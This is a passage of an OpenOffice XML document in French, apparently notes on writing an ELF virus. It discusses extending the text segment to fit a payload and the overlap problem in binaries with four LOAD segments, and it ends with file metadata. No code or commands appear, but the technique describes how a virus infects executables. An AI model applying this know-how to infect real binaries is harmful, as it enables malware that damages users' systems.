      <text:p text:style-name="P2"><text:span text:style-name="T35">Il faut bien avoir conscience que </text:span><text:span text:style-name="T36">nous ne touchons pas aux adresses virtuelles</text:span><text:span text:style-name="T35">. L'extension du segment se fait uniquement dans le fichier. Cela ne pose pas de problème dans cette configuration </text:span><text:soft-page-break/><text:span text:style-name="T35">classique, car il y a </text:span><text:span text:style-name="T36">suffisamment d'espace </text:span><text:span text:style-name="T35">entre l'adresse virtuelle du segment texte, et celle du segment suivant (0x0 – 0x207a70).</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">On peut tout à fait étendre le segment texte de plusieurs pages sans problèmes, car lorsque les différents segments seront chargés en mémoire, il y aura suffisamment d'écart entre les adresses virtuelles des segments pour insérer dans la mémoire les pages qu'on aura rajouté dans le fichier.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P2"><text:span text:style-name="T35">Un problème survient cependant pour les binaires ELF </text:span><text:span text:style-name="T36">récemment compilés</text:span><text:span text:style-name="T35"> et présentant </text:span><text:span text:style-name="T36">4 segments LOAD</text:span><text:span text:style-name="T35"> :</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><draw:frame draw:style-name="fr1" draw:name="images6" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="12.506cm" draw:z-index="5"><draw:image xlink:href="Pictures/2000000700004CB10000386F5ECCE4D3.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P17">Sur pourquoi on trouve certains binaires avec 4 segments LOAD :</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/57761007/why-an-elf-executable-could-have-4-load-segments" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T7">https://stackoverflow.com/questions/57761007/why-an-elf-executable-could-have-4-load-segments</text:span></text:a><text:span text:style-name="T35"> </text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">On remarque ici que dans cette configuration, les adresses virtuelles du segment texte (0x3000) et du segment suivant (0xd000) sont bien plus proches que dans la configuration précédente.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">Dans la configuration précédente, il y avait bien plus d'espace entre les adresses virtuelles auxquelles étaient chargées le segment texte et le segment suivant qu'entre ces segments dans le fichier.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P2"><text:span text:style-name="T35">Le problème ici qu'on va rencontrer lorsqu'on va essayer d'étendre le segment texte de ce type de fichiers binaires à 4 segments LOAD (car notre payload ne tient pas dans le gap de padding), est que les adresses virtuelles du segment texte et du segment suivant vont </text:span><text:span text:style-name="T36">overlap</text:span><text:span text:style-name="T35"> :</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><draw:frame draw:style-name="fr3" draw:name="images7" text:anchor-type="paragraph" svg:width="18.202cm" svg:height="13.977cm" draw:z-index="6"><draw:image xlink:href="Pictures/2000000700004AD5000039784E2A275C.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P5">0x3000 + 0xa03d = 0xd03d</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P2"><text:span text:style-name="T35">Le virus sera donc copié jusqu'à 0xd03d, or le segment suivant le segment texte sera chargé en mémoire à l'adresse </text:span><text:span text:style-name="T5">0xd000</text:span><text:span text:style-name="T35">.</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P2"><text:span text:style-name="T35">On aura un overlapping des segments, et d'ailleurs puisque le segment suivant le segment texte sera chargé en mémoire </text:span><text:span text:style-name="T7">après</text:span><text:span text:style-name="T35"> notre segment texte, la fin du virus sera écrasée par les données du segment suivant, ce qui va provoquer des segfaults / illegal hardware instruction.</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P2"><text:span text:style-name="T35">Une solution naïve serait de tenter de </text:span><text:span text:style-name="T36">décaler </text:span><text:span text:style-name="T35">les adresses virtuelles des segments suivants, de la même façon qu'on décale les offsets du fichier. J'ai essayé de le faire, et cela n'a pas fonctionné car </text:span><text:span text:style-name="T36">même après avoir décalé les adresses virtuelles, patch toutes les relocations</text:span><text:span text:style-name="T35">, le problème est que lorsqu'on a affaire à du </text:span><text:span text:style-name="T36">PIC</text:span><text:span text:style-name="T35">, toutes les instructions du segment texte fonctionnent en </text:span><text:span text:style-name="T36">offset mémoire</text:span><text:span text:style-name="T35"> (par exemple pour faire appel au </text:span><text:span text:style-name="T36">GOT</text:span><text:span text:style-name="T35">). En décalant les adresses virtuelles des segments suivant notre segment texte, on modifie également en mémoire les offsets des appels de fonction et des variables du segment texte. Il semble difficile (impossible ?) de patcher l'intégralité des offsets du segment texte pour annuler cet eff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35M51S</meta:editing-duration>
    <meta:editing-cycles>18</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.11$Win32 OpenOffice.org_project/4111m1$Build-9808</meta:generator>
    <dc:date>2022-02-05T11:38:47.48</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="7" meta:object-count="0" meta:page-count="11" meta:paragraph-count="241" meta:word-count="3217" meta:character-count="19034"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>